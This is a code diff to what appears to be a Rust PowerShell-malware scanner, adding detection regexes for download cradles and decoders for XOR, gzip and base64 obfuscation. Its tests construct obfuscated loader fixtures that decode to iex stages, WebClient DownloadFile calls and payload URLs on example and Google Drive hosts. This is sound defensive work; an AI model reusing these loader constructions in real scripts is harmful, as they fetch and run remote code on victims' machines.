@@ -10,7 +10,7 @@ use crate::env::{Environment, FsEntry};
 use crate::traits::Trait;
 use crate::util::{
     contains_ascii_case_insensitive, find_ascii_case_insensitive_from, floor_char_boundary,
-    looks_like_liberal_url, snippet_prefix,
+    looks_like_liberal_url,
 };
 use base64::Engine as _;
 use once_cell::sync::Lazy;
@@ -21,6 +21,22 @@ use regex::Regex;
 // case-insensitive, supports single+double quoted strings.
 
 #[expect(clippy::expect_used, reason = "static regex construction")] // regex literals — compile-time constants
+static PS_CMDLET_QUOTED_DQ_URL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b[^\n|;]*?(?:-(?:Uri|Ur)(?:\s+|:|=)|\s)\(?\s*"((?:https?|ftp|file):[\x2f\x5c]+[^"\r\n]+)""#,
+    )
+    .expect("ps cmdlet quoted double url")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_CMDLET_QUOTED_SQ_URL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b[^\n|;]*?(?:-(?:Uri|Ur)(?:\s+|:|=)|\s)\(?\s*'((?:https?|ftp|file):[\x2f\x5c]+[^'\r\n]+)'"#,
+    )
+    .expect("ps cmdlet quoted single url")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
 static IWR_RE: Lazy<Regex> = Lazy::new(|| {
     // Invoke-WebRequest / iwr / wget / curl (PS alias) — optional -Uri, quoted or unquoted URL
     Regex::new(
@@ -89,6 +105,17 @@ static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_URL_ASSIGNMENT_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)^\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*="#).expect("ps url assignment")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static BATCH_SET_URL_ASSIGNMENT_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)^\s*@?set\s+"?([A-Za-z_][A-Za-z0-9_]*)\s*="#)
+        .expect("batch set url assignment in ps scan")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
 static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
     // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
     Regex::new(r#"(?i)\.Download(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#).expect("ds")
@@ -113,6 +140,14 @@ static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
+static DAMAGED_WEBCLIENT_CONSTRUCTOR_METHOD_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(New-Object\s+(?:-TypeName\s+)?(?:System\.)?Net\.WebClient)\.(Download(?:File|String|Data)\s*\()"#,
+    )
+    .expect("damaged webclient constructor method")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
 static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)CallByname\s*\([^)]*?["']DownloadString["'][^)]*?["'](https?://[^"']+)["']"#)
         .expect("callbyname downloadstring")
@@ -120,7 +155,7 @@ static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
 static SELF_B64_MATCH_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
+    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/=(?:\{\})?\]\+\)['"]"#)
         .expect("self b64 match regex")
 });
 
@@ -218,6 +253,14 @@ static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
         r#"(?is)\.\s*\(?\s*["'](?:Download(?:String(?:Task)?Async|String|File|Data)|OpenReadAsync|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
     )
     .expect("dynamic download invoke")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static DYNAMIC_VAR_METHOD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\.\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
+    )
+    .expect("dynamic variable method invoke")
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
@@ -329,8 +372,33 @@ fn bits_positional_destination_from(text: &str) -> Option<String> {
         .cloned()
 }
 
+const PS_SIDE_EFFECT_EXPAND_MAX_BYTES: usize = 1_000_000;
+
+#[allow(dead_code)]
 pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
-    let text_expanded = expand_obfuscation(text);
+    ps_download_side_effects_until(text, None).0
+}
+
+pub(crate) fn ps_download_side_effects_until(
+    text: &str,
+    deadline: Option<std::time::Instant>,
+) -> (Vec<(String, String)>, bool) {
+    if ps_deadline_expired(deadline) {
+        return (Vec::new(), true);
+    }
+    if text.len() > PS_SIDE_EFFECT_EXPAND_MAX_BYTES {
+        return (Vec::new(), false);
+    }
+    let (text_expanded, timed_out) = if looks_like_dense_skip_nth_payload(text) {
+        (expand_dense_skip_nth_payload(text), false)
+    } else if looks_like_for_substring_stride_payload(text) {
+        (expand_for_substring_stride_fast_path_payload(text), false)
+    } else {
+        expand_obfuscation_until(text, deadline)
+    };
+    if timed_out {
+        return (Vec::new(), true);
+    }
     let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
     let candidates: Vec<String> = if text_aliased != text_expanded {
         vec![text_expanded, text_aliased]
@@ -353,6 +421,9 @@ pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
 
     for text in &candidates {
         for re in regexes {
+            if ps_deadline_expired(deadline) {
+                return (out, true);
+            }
             for caps in re.captures_iter(text) {
                 let Some(url_match) = caps.get(1) else {
                     continue;
@@ -386,7 +457,7 @@ pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
         }
     }
 
-    out
+    (out, false)
 }
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
@@ -880,6 +951,12 @@ static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_INVOKE_EXPRESSION_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)\b(?:iex|invoke-expression)\s+\$([A-Za-z_][A-Za-z0-9_]*)\b"#)
+        .expect("ps invoke-expression var regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
 static READ_TO_END_RE: Lazy<Regex> =
     Lazy::new(|| Regex::new(r#"(?i)\.ReadToEnd\s*\(\s*\)"#).expect("readtoend regex"));
 
@@ -954,10 +1031,122 @@ fn decompress_ps_stream(
     }
 }
 
+pub(crate) fn recover_deflate_xor_base64_assembly_payloads(
+    text: &str,
+    deadline: Option<std::time::Instant>,
+) -> Vec<Vec<u8>> {
+    const MAX_SCRIPT_BYTES: usize = 4 * 1024 * 1024;
+    const MAX_PAYLOAD_BYTES: usize = 16 * 1024 * 1024;
+
+    if text.len() > MAX_SCRIPT_BYTES
+        || ps_deadline_expired(deadline)
+        || !looks_like_deflate_xor_base64_assembly_loader(text)
+    {
+        return Vec::new();
+    }
+
+    let definitions: Vec<_> = PS_FUNCTION_DEF_RE.captures_iter(text).collect();
+    let mut loader_names = Vec::new();
+    for (idx, caps) in definitions.iter().enumerate() {
+        let Some(name) = caps.get(1).map(|matched| matched.as_str()) else {
+            continue;
+        };
+        let Some(full) = caps.get(0) else {
+            continue;
+        };
+        let end = definitions
+            .get(idx + 1)
+            .and_then(|next| next.get(0).map(|matched| matched.start()))
+            .unwrap_or(text.len())
+            .min(full.start().saturating_add(16 * 1024));
+        let body = &text[full.end()..end];
+        if contains_ascii_case_insensitive(body, "decompress")
+            && contains_ascii_case_insensitive(body, "xor")
+            && contains_ascii_case_insensitive(body, "assembly")
+        {
+            loader_names.push(name);
+        }
+    }
+
+    let mut recovered = Vec::new();
+    for name in loader_names {
+        if ps_deadline_expired(deadline) {
+            break;
+        }
+        let pattern = format!(
+            r#"(?im)(?:^|[;\r\n])\s*{}\s+-a\s*["']([A-Za-z0-9+/=]+)["']\s+-b\s*(0x[0-9a-f]+|\d+)\b"#,
+            regex::escape(name)
+        );
+        let Ok(call_re) = Regex::new(&pattern) else {
+            continue;
+        };
+        for caps in call_re.captures_iter(text) {
+            if ps_deadline_expired(deadline) {
+                return recovered;
+            }
+            let Some(blob) = caps.get(1).map(|matched| matched.as_str()) else {
+                continue;
+            };
+            if !(16..=MAX_SCRIPT_BYTES).contains(&blob.len()) {
+                continue;
+            }
+            let Some(key) = caps
+                .get(2)
+                .and_then(|matched| parse_powershell_byte_literal(matched.as_str()))
+            else {
+                continue;
+            };
+            let Ok(encrypted) = base64::engine::general_purpose::STANDARD.decode(blob) else {
+                continue;
+            };
+            let xored: Vec<u8> = encrypted.into_iter().map(|byte| byte ^ key).collect();
+            let Some(payload) =
+                decompress_ps_stream(&xored, PsCompressionStream::Deflate, MAX_PAYLOAD_BYTES)
+            else {
+                continue;
+            };
+            if looks_like_portable_executable(&payload) {
+                recovered.push(payload);
+            }
+        }
+    }
+    recovered
+}
+
+fn looks_like_deflate_xor_base64_assembly_loader(text: &str) -> bool {
+    contains_ascii_case_insensitive(text, "function")
+        && contains_ascii_case_insensitive(text, "deflatestream")
+        && contains_ascii_case_insensitive(text, "frombase64string")
+        && contains_ascii_case_insensitive(text, "assembly]::load")
+}
+
+fn parse_powershell_byte_literal(value: &str) -> Option<u8> {
+    let value = value.trim();
+    if let Some(hex) = value.strip_prefix("0x") {
+        u8::from_str_radix(hex, 16).ok()
+    } else {
+        value.parse::<u8>().ok()
+    }
+}
+
+fn looks_like_portable_executable(bytes: &[u8]) -> bool {
+    if bytes.len() < 0x40 || !bytes.starts_with(b"MZ") {
+        return false;
+    }
+    let offset = u32::from_le_bytes(bytes[0x3c..0x40].try_into().unwrap_or_default()) as usize;
+    bytes
+        .get(offset..offset.saturating_add(4))
+        .is_some_and(|signature| signature == b"PE\0\0")
+}
+
 #[cfg(test)]
 mod gzip_base64_prefilter_tests {
+    use base64::Engine as _;
+    use std::io::Write as _;
+
     use super::{
         expand_gzip_base64_literals, expand_gzip_function_base64_variables, gzip_wrapper_bounds,
+        normalize_ps1_text,
     };
 
     #[test]
@@ -995,6 +1184,30 @@ mod gzip_base64_prefilter_tests {
             "é".repeat(4096)
         );
         assert_eq!(expand_gzip_function_base64_variables(&text), text);
+    }
+
+    #[test]
+    #[expect(clippy::expect_used, reason = "infallible in-memory gzip fixture")]
+    fn normalizes_variable_backed_gzip_stream_iex_stage() {
+        let stage = "Invoke-WebRequest -Uri 'https://gzip-variable.example/payload.ps1'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder
+            .write_all(stage.as_bytes())
+            .expect("writes gzip fixture");
+        let b64 = base64::engine::general_purpose::STANDARD
+            .encode(encoder.finish().expect("finishes gzip fixture"));
+        let script = format!(
+            "$blob='{b64}';\
+             $ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($blob));\
+             $gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);\
+             $sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd())"
+        );
+
+        let normalized = normalize_ps1_text(&script);
+        assert!(
+            normalized.contains("https://gzip-variable.example/payload.ps1"),
+            "variable-backed GZip IEX stage was not normalized: {normalized}"
+        );
     }
 }
 
@@ -1361,13 +1574,58 @@ fn decode_ps_getstring_bytes(encoding: &str, bytes: &[u8]) -> Option<String> {
 
 #[cfg(test)]
 mod getstring_base64_prefilter_tests {
-    use super::{expand_getstring_base64_literals, expand_getstring_base64_variables};
+    use base64::Engine as _;
+    use std::io::Write as _;
+
+    use super::{
+        expand_getstring_base64_literals, expand_getstring_base64_variables, normalize_ps1_text,
+    };
 
     #[test]
     fn ignores_text_without_getstring_base64_shape() {
         let text = "Write-Host 'hello world'";
         assert_eq!(expand_getstring_base64_literals(text), text);
         assert_eq!(expand_getstring_base64_variables(text), text);
+    }
+
+    #[test]
+    #[expect(clippy::expect_used, reason = "infallible in-memory gzip fixture")]
+    fn normalizes_marker_replaced_nested_getstring_base64_literal() {
+        let marker = "zvzrdidyvslx";
+        let final_stage = "Invoke-WebRequest -Uri 'https://marker-replace.example/payload.ps1'";
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder
+            .write_all(final_stage.as_bytes())
+            .expect("writes gzip fixture");
+        let gzip_b64 = base64::engine::general_purpose::STANDARD
+            .encode(encoder.finish().expect("finishes gzip fixture"));
+        let stage = format!(
+            "$blob='{gzip_b64}';\
+             $ms=New-Object IO.MemoryStream(,[Convert]::FromBase64String($blob));\
+             $gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);\
+             $sr=New-Object IO.StreamReader($gz);iex($sr.ReadToEnd())"
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            stage
+                .encode_utf16()
+                .flat_map(u16::to_le_bytes)
+                .collect::<Vec<_>>(),
+        );
+        let mut noisy = String::with_capacity(b64.len() + b64.len() / 35 * marker.len());
+        for chunk in b64.as_bytes().chunks(35) {
+            noisy.push_str(&String::from_utf8_lossy(chunk));
+            noisy.push_str(marker);
+        }
+        let text = format!(
+            "\"iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{}').Replace('{}',''))))\"",
+            noisy, marker
+        );
+
+        let normalized = normalize_ps1_text(&text);
+        assert!(
+            normalized.contains("https://marker-replace.example/payload.ps1"),
+            "marker-replaced Base64 stage was not normalized: {normalized}"
+        );
     }
 }
 
@@ -1531,11 +1789,93 @@ fn append_decoded_inline_xor_base64_functions(text: &str) -> String {
     out
 }
 
-fn decode_inline_xor_base64_functions(text: &str) -> Vec<Vec<u8>> {
-    if !contains_ascii_case_insensitive(text, "-bxor") {
-        return Vec::new();
+fn expand_keyed_base64_xor_string_fragments(text: &str) -> String {
+    if !contains_ascii_case_insensitive(text, "function")
+        || !contains_ascii_case_insensitive(text, "frombase64st")
+        || !contains_ascii_case_insensitive(text, "-bxor")
+    {
+        return text.to_string();
     }
 
+    let key_arrays = inline_xor_key_arrays(text);
+    if key_arrays.is_empty() {
+        return text.to_string();
+    }
+
+    let mut function_defs: Vec<(String, Vec<u8>)> = Vec::new();
+    let defs: Vec<_> = PS_FUNCTION_DEF_RE.captures_iter(text).collect();
+    for (idx, caps) in defs.iter().enumerate() {
+        let Some(name_match) = caps.get(1) else {
+            continue;
+        };
+        let Some(full_match) = caps.get(0) else {
+            continue;
+        };
+        let end = defs
+            .get(idx + 1)
+            .and_then(|next| next.get(0).map(|m| m.start()))
+            .unwrap_or(text.len())
+            .min(full_match.start().saturating_add(16 * 1024));
+        let body = &text[full_match.start()..end];
+        if !contains_ascii_case_insensitive(body, "frombase64st") {
+            continue;
+        }
+        let lower_body = body.to_ascii_lowercase();
+        let Some(key) = key_arrays.iter().find_map(|(key_name, key)| {
+            lower_body
+                .contains(&format!("${}", key_name))
+                .then_some(key.clone())
+        }) else {
+            continue;
+        };
+        function_defs.push((name_match.as_str().to_string(), key));
+    }
+    if function_defs.is_empty() {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, key) in function_defs {
+        let call_re_str = format!(
+            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([A-Za-z0-9+/=]{{8,8192}})['"]\s*\)?"#,
+            regex::escape(&name)
+        );
+        let Ok(call_re) = Regex::new(&call_re_str) else {
+            continue;
+        };
+        let matches: Vec<(usize, usize, String)> = call_re
+            .captures_iter(&out)
+            .filter_map(|caps| {
+                let full = caps.get(0)?;
+                let blob = caps.get(1)?.as_str();
+                let decoded = decode_keyed_base64_xor_fragment(blob, &key)?;
+                if !looks_like_decoded_xor_fragment(&decoded) {
+                    return None;
+                }
+                let decoded_text = String::from_utf8_lossy(&decoded).to_string();
+                if !decoded_xor_fragment_is_interesting(&decoded_text) {
+                    return None;
+                }
+                let raw_match = full.as_str();
+                let name_start = raw_match
+                    .find(|c: char| c.is_alphanumeric() || c == '_')
+                    .unwrap_or(0);
+                let prefix = &raw_match[..name_start];
+                Some((
+                    full.start(),
+                    full.end(),
+                    format!("{}'{}'", prefix, decoded_text.replace('\'', "")),
+                ))
+            })
+            .collect();
+        for (start, end, replacement) in matches.into_iter().rev() {
+            out.replace_range(start..end, &replacement);
+        }
+    }
+    out
+}
+
+fn inline_xor_key_arrays(text: &str) -> std::collections::HashMap<String, Vec<u8>> {
     let mut key_arrays = std::collections::HashMap::new();
     for caps in INLINE_XOR_KEY_ARRAY_RE.captures_iter(text) {
         let Some(name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
@@ -1548,10 +1888,68 @@ fn decode_inline_xor_base64_functions(text: &str) -> Vec<Vec<u8>> {
             .split(',')
             .filter_map(|part| part.trim().parse::<u8>().ok())
             .collect();
-        if !key.is_empty() {
+        if (1..=32).contains(&key.len()) {
             key_arrays.insert(name, key);
         }
     }
+    key_arrays
+}
+
+fn decode_keyed_base64_xor_fragment(blob: &str, key: &[u8]) -> Option<Vec<u8>> {
+    if key.is_empty() {
+        return None;
+    }
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(blob)
+        .ok()?;
+    if decoded.is_empty() || decoded.len() > 64 * 1024 {
+        return None;
+    }
+    Some(
+        decoded
+            .into_iter()
+            .enumerate()
+            .map(|(idx, byte)| byte ^ key[idx % key.len()])
+            .collect(),
+    )
+}
+
+fn looks_like_decoded_xor_fragment(bytes: &[u8]) -> bool {
+    if bytes.is_empty() || bytes.len() > 64 * 1024 || bytes.contains(&0) {
+        return false;
+    }
+    let printable = bytes
+        .iter()
+        .filter(|byte| byte.is_ascii_graphic() || byte.is_ascii_whitespace())
+        .count();
+    if printable * 100 / bytes.len() < 85 {
+        return false;
+    }
+    let text = String::from_utf8_lossy(bytes);
+    text.chars().any(|ch| ch.is_ascii_alphabetic())
+}
+
+fn decoded_xor_fragment_is_interesting(text: &str) -> bool {
+    contains_ascii_case_insensitive(text, "http://")
+        || contains_ascii_case_insensitive(text, "https://")
+        || contains_ascii_case_insensitive(text, "ftp://")
+        || contains_ascii_case_insensitive(text, "file://")
+        || contains_ascii_case_insensitive(text, "downloadfile")
+        || contains_ascii_case_insensitive(text, "downloadstring")
+        || contains_ascii_case_insensitive(text, "net.webclient")
+        || contains_ascii_case_insensitive(text, "frombase64string")
+        || contains_ascii_case_insensitive(text, "invoke-webrequest")
+        || contains_ascii_case_insensitive(text, "invoke-restmethod")
+        || contains_ascii_case_insensitive(text, ".invoke(")
+        || contains_ascii_case_insensitive(text, "new-object")
+}
+
+fn decode_inline_xor_base64_functions(text: &str) -> Vec<Vec<u8>> {
+    if !contains_ascii_case_insensitive(text, "-bxor") {
+        return Vec::new();
+    }
+
+    let key_arrays = inline_xor_key_arrays(text);
     if key_arrays.is_empty() {
         return Vec::new();
     }
@@ -1603,6 +2001,126 @@ fn decode_inline_xor_base64_functions(text: &str) -> Vec<Vec<u8>> {
         }
     }
     out
+}
+
+#[cfg(test)]
+mod inline_xor_function_tests {
+    use super::{
+        expand_dense_skip_nth_payload, expand_for_substring_stride_fast_path_payload,
+        normalize_ps1_payload_for_report_until,
+    };
+    use base64::Engine;
+
+    fn encode_xor_b64(text: &str, key: &[u8]) -> String {
+        let xored: Vec<u8> = text
+            .bytes()
+            .enumerate()
+            .map(|(idx, byte)| byte ^ key[idx % key.len()])
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(xored)
+    }
+
+    #[test]
+    fn nested_keyed_xor_base64_function_calls_are_appended() {
+        let key = [65u8, 113, 117, 105, 102, 117, 103];
+        let url = encode_xor_b64("https://drive.example/payload", &key);
+        let method = encode_xor_b64("DownloadFile", &key);
+        let script = format!(
+            "$dendppeara=@(65,113,117,105,102,117,103);\
+function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
+function Skuri ($translumplemen) {{.($accu) ($translumplemen)}}\
+Function Publi ($klaekningslankslidt,$sabatonsr31=0){{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';Skuri ($raasyltnin);For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}Skuri ('$global:gutters=[Text.Encoding]::ASCII.GetString($tostesa)');if ($sabatonsr31) {{ Skuri $gutters }} else {{ $gutters }}}}\
+$accu='iex';$stjern=Publi '{url}';$spyd=Publi '{method}';"
+        );
+
+        let (normalized, timed_out) =
+            normalize_ps1_payload_for_report_until(script.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("https://drive.example/payload"),
+            "normalized payload did not include decoded URL:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("DownloadFile"),
+            "normalized payload did not include decoded method:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn substring_stride_fast_path_expands_keyed_xor_base64_calls() {
+        let key = [65u8, 113, 117, 105, 102, 117, 103];
+        let ua = encode_xor_b64(
+            "5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
+            &key,
+        );
+        let url = encode_xor_b64(
+            "https://drive.google.com/uc?export=download&id=13xQgCXCMFT32vI379p5cKZXz2jD-uTO4",
+            &key,
+        );
+        let web_client = encode_xor_b64("$global:siouxerf=New-Object Net.WebClient", &key);
+        let method = encode_xor_b64("DownloadFile", &key);
+        let invoke = encode_xor_b64("$siouxerf.$spyd.Invoke($stjern,$sten)", &key);
+        let second_stage = encode_xor_b64(
+            "$global:Trkulud=[Convert]::FromBase64String($dulcified)",
+            &key,
+        );
+        let script = format!(
+            "$dendppeara=@(65,113,117,105,102,117,103);\
+function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
+function Skuri ($translumplemen) {{.($accu) ($translumplemen)}}\
+function guamachil ($klaekningslankslidt) {{ sv 'kursensn';$translu=3;do {{$cere+=$klaekningslankslidt[$translu];$translu+=4}} until (!$klaekningslankslidt[$translu])$cere}}\
+Function Publi ($klaekningslankslidt,$sabatonsr31=0){{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';Skuri ($raasyltnin);;For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}Skuri ('$global:gutters=[Text.Encoding]::ASCII.GetString($t% _  *&';if ($sabatonsr31) {{ Skuri $gutters}}else {{;$gutters}}}}\
+$accu='iex';$divisibl=Publi '{ua}';$stjern=Publi '{url}';Publi '{web_client}' 1;$spyd=Publi '{method}';$oprrsa=Publi '{invoke}';Publi '{second_stage}' 1;"
+        );
+
+        let normalized = expand_for_substring_stride_fast_path_payload(&script);
+
+        assert!(
+            normalized.contains("https://drive.google.com/uc?export=download&id="),
+            "fast-path output did not include decoded URL:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("$global:siouxerf=New-Object Net.WebClient"),
+            "fast-path output did not include decoded WebClient setup:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("DownloadFile"),
+            "fast-path output did not include decoded method:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("$siouxerf.$spyd.Invoke($stjern,$sten)"),
+            "fast-path output did not include decoded dynamic invocation:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("[Convert]::FromBase64String($dulcified)"),
+            "fast-path output did not include decoded second-stage decode:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn dense_skip_nth_fast_path_expands_keyed_xor_base64_calls() {
+        let key = [65u8, 113, 117, 105, 102, 117, 103];
+        let url = encode_xor_b64("https://drive.google.com/uc?export=download&id=abc", &key);
+        let method = encode_xor_b64("DownloadFile", &key);
+        let script = format!(
+            "$dendppeara=@(65,113,117,105,102,117,103);\
+function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
+Function Publi ($klaekningslankslidt) {{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}}}\
+$stjern=Publi '{url}';$spyd=Publi '{method}';"
+        );
+
+        let normalized = expand_dense_skip_nth_payload(&script);
+
+        assert!(
+            normalized.contains("https://drive.google.com/uc?export=download&id=abc"),
+            "dense fast-path output did not include decoded URL:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("DownloadFile"),
+            "dense fast-path output did not include decoded method:\n{normalized}"
+        );
+    }
 }
 
 #[cfg(test)]
@@ -1896,7 +2414,45 @@ fn ps_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
             bindings.insert(name, value);
         }
     }
+    for _ in 0..3 {
+        let mut changed = false;
+        for caps in PS_MIXED_CONCAT_ASSIGN_RE.captures_iter(text) {
+            let (Some(name), Some(rhs)) = (caps.get(1), caps.get(2)) else {
+                continue;
+            };
+            let Some(value) = resolve_ps_mixed_concat_expr(rhs.as_str(), &bindings) else {
+                continue;
+            };
+            let key = name.as_str().to_ascii_lowercase();
+            if bindings.get(&key) != Some(&value) {
+                bindings.insert(key, value);
+                changed = true;
+            }
+        }
+        if !changed {
+            break;
+        }
+    }
     bindings
+}
+
+fn resolve_ps_mixed_concat_expr(
+    rhs: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let mut out = String::new();
+    let mut saw_part = false;
+    for caps in PS_MIXED_CONCAT_PART_RE.captures_iter(rhs) {
+        if let Some(name) = caps.get(1) {
+            out.push_str(bindings.get(&name.as_str().to_ascii_lowercase())?);
+        } else if let Some(value) = caps.get(2) {
+            out.push_str(&value.as_str().replace("''", "'"));
+        } else if let Some(value) = caps.get(3) {
+            out.push_str(value.as_str());
+        }
+        saw_part = true;
+    }
+    saw_part.then_some(out)
 }
 
 fn expand_start_process_argument_list(text: &str) -> String {
@@ -2550,6 +3106,9 @@ fn expand_ps_replace(text: &str) -> String {
                 let operator = caps.get(3)?.as_str();
                 let needle = ps_capture_string(&caps, 4, 5)?;
                 let repl = ps_capture_string(&caps, 6, 7)?;
+                if needle.is_empty() {
+                    return None;
+                }
                 let new_str = if operator.eq_ignore_ascii_case("ireplace") {
                     replace_ascii_case_insensitive(&haystack, &needle, &repl)
                 } else {
@@ -2581,6 +3140,12 @@ mod ps_replace_prefilter_tests {
         let text = "Write-Host 'hello world'";
         assert_eq!(expand_ps_replace(text), text);
     }
+
+    #[test]
+    fn ignores_empty_replace_pattern() {
+        let text = "'abc' -replace '', 'X'";
+        assert_eq!(expand_ps_replace(text), text);
+    }
 }
 
 fn expand_ps_dot_replace(text: &str) -> String {
@@ -2591,7 +3156,13 @@ fn expand_ps_dot_replace(text: &str) -> String {
     let mut matches = Vec::new();
     let mut start = 0;
     while let Some((literal_start, literal_end, haystack)) = next_ps_quoted_literal(text, start) {
+        let replacement_start = previous_non_whitespace_ascii_pos(text, literal_start)
+            .filter(|pos| bytes.get(*pos) == Some(&b'('))
+            .unwrap_or(literal_start);
         let mut pos = skip_ascii_ws(bytes, literal_end);
+        if replacement_start < literal_start && bytes.get(pos) == Some(&b')') {
+            pos = skip_ascii_ws(bytes, pos + 1);
+        }
         if bytes.get(pos) != Some(&b'.') {
             start = literal_end;
             continue;
@@ -2616,7 +3187,7 @@ fn expand_ps_dot_replace(text: &str) -> String {
             continue;
         }
         pos = skip_ascii_ws(bytes, pos + 1);
-        let Some((needle_end, needle)) = parse_ps_quoted_literal(text, pos) else {
+        let Some((needle_end, needle)) = parse_ps_replace_arg(text, pos) else {
             start = literal_end;
             continue;
         };
@@ -2626,7 +3197,7 @@ fn expand_ps_dot_replace(text: &str) -> String {
             continue;
         }
         pos = skip_ascii_ws(bytes, pos + 1);
-        let Some((repl_end, repl)) = parse_ps_quoted_literal(text, pos) else {
+        let Some((repl_end, repl)) = parse_ps_replace_arg(text, pos) else {
             start = literal_end;
             continue;
         };
@@ -2635,8 +3206,16 @@ fn expand_ps_dot_replace(text: &str) -> String {
             start = literal_end;
             continue;
         }
+        if needle.is_empty() {
+            start = pos + 1;
+            continue;
+        }
         let replaced = haystack.replace(&needle, &repl);
-        matches.push((literal_start, pos + 1, format!("'{}'", replaced)));
+        matches.push((
+            replacement_start,
+            pos + 1,
+            format!("'{}'", replaced.replace('\'', "''")),
+        ));
         start = pos + 1;
     }
 
@@ -2647,6 +3226,67 @@ fn expand_ps_dot_replace(text: &str) -> String {
     out
 }
 
+fn previous_non_whitespace_ascii_pos(text: &str, pos: usize) -> Option<usize> {
+    let bytes = text.as_bytes();
+    let mut idx = pos.min(bytes.len());
+    while idx > 0 {
